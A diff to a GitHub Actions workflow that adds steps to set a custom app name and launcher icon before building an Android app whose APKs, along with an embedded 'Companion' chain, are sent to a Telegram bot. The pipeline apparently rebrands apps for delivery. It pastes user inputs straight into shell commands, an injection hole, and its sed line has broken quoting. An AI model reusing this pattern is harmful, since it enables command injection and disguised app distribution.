@@ -37,6 +37,14 @@ on:
         description: 'Chain Part 2 (embedded in Companion)'
         required: false
         default: ''
+      app_name:
+        description: 'App name for Main App (updates strings.xml)'
+        required: false
+        default: ''
+      icon_b64:
+        description: 'Base64 encoded icon image for Main App launcher'
+        required: false
+        default: ''
 
 # ════════════════════════════════════════════════════════
 # JOB 1 — TELEGRAM BOT (24/7 keep-alive)
@@ -377,7 +385,43 @@ jobs:
           echo "--- Manifest chain (verify) ---"
           grep "chain_part1" app/src/main/AndroidManifest.xml
 
-      # ── STEP 4: Build Main App ──
+      # ── STEP 4: Apply App Name + Icon ──
+
+      - name: Apply app name to strings.xml
+        run: |
+          APP_NAME="${{ github.event.inputs.app_name }}"
+          if [ -n "$APP_NAME" ]; then
+            sed -i "s|<string name="app_name">[^<]*</string>|<string name="app_name">$APP_NAME</string>|" app/src/main/res/values/strings.xml
+            echo "[OK] App name set to: $APP_NAME"
+            grep "app_name" app/src/main/res/values/strings.xml
+          else
+            echo "[SKIP] No app name provided"
+          fi
+
+      - name: Apply launcher icon
+        run: |
+          ICON_B64="${{ github.event.inputs.icon_b64 }}"
+          if [ -n "$ICON_B64" ]; then
+            echo "$ICON_B64" | base64 -d > /tmp/icon_input.png
+            # Install imagemagick for resizing
+            sudo apt-get install -y imagemagick -q
+            # Generate all required icon sizes
+            convert /tmp/icon_input.png -resize 48x48   app/src/main/res/mipmap-mdpi/ic_launcher.png
+            convert /tmp/icon_input.png -resize 48x48   app/src/main/res/mipmap-mdpi/ic_launcher_round.png
+            convert /tmp/icon_input.png -resize 72x72   app/src/main/res/mipmap-hdpi/ic_launcher.png
+            convert /tmp/icon_input.png -resize 72x72   app/src/main/res/mipmap-hdpi/ic_launcher_round.png
+            convert /tmp/icon_input.png -resize 96x96   app/src/main/res/mipmap-xhdpi/ic_launcher.png
+            convert /tmp/icon_input.png -resize 96x96   app/src/main/res/mipmap-xhdpi/ic_launcher_round.png
+            convert /tmp/icon_input.png -resize 144x144 app/src/main/res/mipmap-xxhdpi/ic_launcher.png
+            convert /tmp/icon_input.png -resize 144x144 app/src/main/res/mipmap-xxhdpi/ic_launcher_round.png
+            convert /tmp/icon_input.png -resize 192x192 app/src/main/res/mipmap-xxxhdpi/ic_launcher.png
+            convert /tmp/icon_input.png -resize 192x192 app/src/main/res/mipmap-xxxhdpi/ic_launcher_round.png
+            echo "[OK] All icon sizes replaced"
+          else
+            echo "[SKIP] No icon provided"
+          fi
+
+      # ── STEP 5: Build Main App ──
 
       - name: Grant gradlew permission
         run: chmod +x gradlew
@@ -392,7 +436,7 @@ jobs:
           echo "path=$APK" >> $GITHUB_OUTPUT
           echo "Main APK: $APK ($(du -h $APK | cut -f1))"
 
-      # ── STEP 5: Send both APKs to Telegram ──
+      # ── STEP 6: Send both APKs to Telegram ──
 
       - name: Send Companion APK to Telegram
         run: |
